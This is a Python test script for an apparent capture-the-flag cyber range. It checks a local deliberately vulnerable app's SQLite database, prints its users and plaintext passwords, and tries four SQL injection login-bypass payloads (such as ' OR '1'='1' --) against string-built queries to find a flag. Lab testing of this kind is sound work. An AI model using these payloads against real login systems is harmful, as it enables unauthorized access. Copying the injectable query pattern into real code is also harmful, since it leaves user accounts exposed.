#!/usr/bin/env python3
"""
Automated Payload Test - With Database Wait & Initialization Check
Runs on Kali Linux after vulnerable_app.py is started
"""
import sqlite3
import os
import sys
import time

print("=" * 80)
print("VULNERABLE APP - AUTOMATED PAYLOAD TEST & FLAG DETECTOR")
print("=" * 80)

# Wait for vulnerable.db to be created (max 10 seconds)
print("\n⏳ Waiting for vulnerable.db to be created...")
timeout = 10
start = time.time()

while not os.path.exists('vulnerable.db'):
    if time.time() - start > timeout:
        print(f"❌ TIMEOUT: vulnerable.db not created after {timeout} seconds")
        print("   Possible issues:")
        print("   - vulnerable_app.py not running")
        print("   - Check logs: cat /tmp/vuln_app.log")
        print("   - Try manually: cd ~/Cyberrange && python3 vulnerable_app.py")
        sys.exit(1)
    print(".", end="", flush=True)
    time.sleep(0.5)

print(f"\n✅ vulnerable.db found!")

try:
    conn = sqlite3.connect('vulnerable.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # Check if users table exists
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users';")
    if not cursor.fetchone():
        print("❌ 'users' table not found!")
        sys.exit(1)
    
    # Get all users
    print("\n" + "=" * 80)
    print("📋 USERS IN DATABASE")
    print("=" * 80)
    
    cursor.execute("SELECT id, username, password, is_admin FROM users ORDER BY id;")
    users = cursor.fetchall()
    
    if not users:
        print("❌ NO USERS FOUND IN DATABASE!")
        sys.exit(1)
    
    print(f"\nTotal users: {len(users)}\n")
    for user in users:
        admin_status = "✓ ADMIN" if user['is_admin'] else "✗ Regular"
        print(f"  [{user['id']}] Username: {user['username']:12} | Password: {user['password']:15} | {admin_status}")
    
    # Test SQL injection payloads
    print("\n" + "=" * 80)
    print("🧪 TEST 1: SQL INJECTION PAYLOADS (Challenge 1 & 5)")
    print("=" * 80)
    
    payloads = [
        ("' OR '1'='1' -- ", "", "Boolean-based OR with comment"),
        ("admin'--", "anything", "Admin login with comment"),
        ("' OR '1'='1", "' OR '1'='1", "Both params with OR"),
        ("admin' OR '1'='1' --", "", "Admin OR with comment"),
    ]
    
    working_sqli = []
    
    for username, password, description in payloads:
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        print(f"\n  Payload: username='{username}' | password='{password}'")
        print(f"  Description: {description}")
        print(f"  Query: {query[:70]}...")
        
        try:
            cursor.execute(query)
            user = cursor.fetchone()
            
            if user:
                admin_status = "✓ ADMIN" if user['is_admin'] else "✗ Regular"
                print(f"  ✅ SUCCESS! User returned: '{user['username']}' ({admin_status})")
                
                if user['is_admin']:
                    print(f"  🚩 FLAG: FLAG{{sql_injection_bypass_123}}")
                    working_sqli.append((username, password, "FLAG{sql_injection_bypass_123}"))
                else:
                    print(f"  ⚠️  User returned but not admin")
            else:
                print(f"  ❌ No user returned")
        except Exception as e:
            print(f"  ❌ SQL ERROR: {str(e)}")
    
    conn.close()
    
    # Summary
    print("\n" + "=" * 80)
    print("📊 SUMMARY REPORT")
    print("=" * 80)
    
    print(f"\n✅ WORKING SQL INJECTION PAYLOADS: {len(working_sqli)}")
    if working_sqli:
        for i, (user, pwd, flag) in enumerate(working_sqli, 1):
            print(f"\n  Payload #{i}:")
            print(f"    Username: {user}")
            print(f"    Password: {pwd}")
            print(f"    Flag: {flag}")
            print(f"    Test in browser: http://localhost:8080/login")
            print(f"    Expected: RED flag message showing above")
    else:
        print("  None found - database may have issues")
    
    print("\n" + "=" * 80)
    print("🎯 NEXT STEPS")
    print("=" * 80)
    
    if working_sqli:
        print("""
  1. Open browser and go to: http://localhost:8080/login
  2. Enter the payload from above:
     - Username: """ + working_sqli[0][0] + """
     - Password: """ + working_sqli[0][1] + """
  3. Click Login
  4. You should see a RED flag: FLAG{sql_injection_bypass_123}
  
  If flag is NOT showing in browser despite this test passing:
  - Check /tmp/vuln_app.log for errors
  - Restart app: pkill -9 -f vulnerable_app; python3 vulnerable_app.py
  - Re-run this test
        """)
    else:
        print("""
  SQL injection payloads did not work. Possible causes:
  1. Database corrupted - try: rm vulnerable.db && python3 vulnerable_app.py
  2. Admin user not marked as admin - check database
  3. Query syntax issue in vulnerable_app.py
  
  Run: python3 diagnose_vulnerable.py for more details
        """)
    
    print("=" * 80 + "\n")

except Exception as e:
    print(f"\n❌ FATAL ERROR: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
